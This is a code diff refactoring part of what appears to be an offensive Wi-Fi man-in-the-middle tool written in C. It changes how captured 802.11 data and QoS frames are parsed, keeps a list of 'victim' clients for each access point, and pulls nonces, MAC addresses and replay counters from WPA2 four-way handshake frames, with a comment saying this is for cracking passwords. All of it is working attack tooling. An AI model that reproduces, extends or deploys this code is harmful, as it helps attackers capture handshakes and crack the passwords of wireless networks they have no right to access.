@@ -58,8 +58,7 @@ static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet
 		log_printf(MSG_DEBUG, "Capture 2 of 4-way pakcet, fill SN,SA");
         info->version = packet->auth_data.key_information & WPA_KEY_INFO_TYPE_MASK;
 		memcpy(info->SN, packet->auth_data.Nonce, NONCE_ALEN);	
-		memcpy(info->SA, LOCATE(u8, packet->ieee80211_data, 
-					struct ieee80211_hdr_3addr, addr2), ETH_ALEN);
+		memcpy(info->SA, packet->ieee80211_header.addr2, ETH_ALEN);
 		memcpy(info->counter, packet->auth_data.replay_counter, 8);
 		SET(2,info->enough);
 	}
@@ -67,8 +66,7 @@ static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet
 	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
 	    (packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
 	    (packet->auth_data.key_information & WPA_KEY_INFO_INSTALL) &&
-	    !memcmp(info->SA, LOCATE(u8, packet->ieee80211_data, 
-			    struct ieee80211_hdr_3addr, addr1), ETH_ALEN)) {
+	    !memcmp(info->SA, packet->ieee80211_header.addr1, ETH_ALEN)) {
 		memcpy(info->AN, packet->auth_data.Nonce, NONCE_ALEN);
 		log_printf(MSG_DEBUG, "Capture 3 of 4-way packet, fill AN");
 		SET(3, info->enough);
@@ -150,7 +148,6 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 	struct MITM *MITM = (struct MITM *)ctx; 
 	uint32_t offset;
 	uint16_t type;
-	void *packet = NULL;
 	char* mac_s;
 	mac_s = malloc(20);
 
@@ -215,68 +212,41 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 			}
 		break;
 
-		case IEEE80211_DATA : {
-			/* we case the packet context util crash password. */
-			if (MITM->state < 2) 
-				break; 
-			packet = malloc(sizeof(struct WPA2_handshake_packet));
-			struct WPA2_handshake_packet *tmp = (struct WPA2_handshake_packet *)packet;
-			tmp->type = type;	
-			tmp->ieee80211_data = (struct ieee80211_hdr_3addr *)(buf + offset);
-			/* Ignore packet which not came from target access point. */
-			if (memcmp(LOCATE(u8 ,tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr1)
-						, MITM->encry_info.AA, ETH_ALEN) &&
-			    memcmp(LOCATE(u8, tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr2)
-				    , MITM->encry_info.AA, ETH_ALEN)) break;
-			offset += sizeof(struct ieee80211_hdr_3addr);
+		case IEEE80211_DATA : 
+		case IEEE80211_QOS_DATA : {
+			struct WPA2_handshake_packet packet;
+			packet.type = type;
 
-			parse_llc_header(buf, len, &offset, packet);
+			memcpy(&packet.ieee80211_header, buf + offset, sizeof(struct ieee80211_hdr_3addr));
 
-			if (tmp->llc_hdr.type == 0x888e && 
-			   (MITM->state == MITM_state_capture_handshake)) {
-				parse_auth_data(buf, len, &offset, packet);
-				fill_encry_info(MITM, packet);
-			}
-
-		break;}
-		
-		case IEEE80211_QOS_DATA :{
-			packet = malloc(sizeof(struct WPA2_handshake_packet));
-			struct WPA2_handshake_packet *tmp = (struct WPA2_handshake_packet *)packet;
-			tmp->type = type;
-			tmp->ieee80211_data = (struct ieee80211_qos_hdr *)(buf + offset);
-			offset += sizeof(struct ieee80211_qos_hdr);
-			
-			parse_llc_header(buf, len , &offset, packet);
+			offset += sizeof(struct ieee80211_hdr);
+			if (packet.type == IEEE80211_QOS_DATA) offset += 2;
+			parse_llc_header(buf, len , &offset, &packet);
 			switch(MITM->state) {
 			case MITM_state_idle :
 			case MITM_state_ap_search :;
-        struct ieee80211_qos_hdr* hdr = (struct ieee80211_qos_hdr*)tmp->ieee80211_data;
 				/* Maintain client list below each AP. */
 				struct access_point_info *ap;
 				dl_list_for_each(ap, &MITM->ap_list, struct access_point_info, ap_node) {
-					if (!memcmp(hdr->addr1, ap->BSSID, ETH_ALEN)) {
-						if (!maintain_victim_list(&ap->client_list, hdr->addr2)) ap->clients++;
+					if (!memcmp(packet.ieee80211_header.addr1, ap->BSSID, ETH_ALEN)) {
+						if (!maintain_victim_list(&ap->client_list, packet.ieee80211_header.addr2)) ap->clients++;
 						break;
 					}
 				}
         break;
 			case MITM_state_capture_handshake :
-				if (tmp->llc_hdr.type == 0x888e) {
-					parse_auth_data(buf, len, &offset, packet);
-					fill_encry_info(MITM, packet);
+				if (packet.llc_hdr.type == 0x888e) {
+					parse_auth_data(buf, len, &offset, &packet);
+					fill_encry_info(MITM, &packet);
 				}
 				break;
       }
 		break;}
-		case IEEE80211_DEAUTHENTICATION :
-		break; 
 
 		default:
 			return;
 	}
 	free(mac_s);
-	free(packet);
 	return;
 }
 
